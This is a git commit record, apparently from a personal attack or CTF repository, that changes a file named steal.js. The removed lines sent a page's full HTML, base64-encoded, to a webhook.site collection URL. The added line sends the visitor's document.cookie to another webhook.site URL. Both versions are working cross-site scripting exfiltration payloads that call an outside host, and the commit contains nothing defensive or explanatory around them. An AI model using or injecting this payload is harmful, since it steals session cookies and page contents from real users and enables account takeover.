9b44824fd93fd1cc813842e066bef87ccc23ee62
Dan1e1B <147431777+Dan1e1B@users.noreply.github.com>
2025-12-28 13:59:00 +0000

    Refactor steal.js to send cookies directly

--- steal.js
+++ steal.js
@@ -1,11 +1,2 @@
 // 1. Navigate to profile
-window.location = '/profile';
-
-// 2. After page loads, send its content
-window.addEventListener('load', function() {
-    setTimeout(() => {
-        var profileContent = document.documentElement.outerHTML;
-        fetch('https://webhook.site/04e02681-01c6-43b0-adf8-8b311acc9b60/?navigated=' + 
-              btoa(profileContent));
-    }, 2000);
-});
+fetch("https://webhook.site/2bfe5e22-b3b8-4685-b127-a69bf9ec6149/cookie=" + document.cookie);
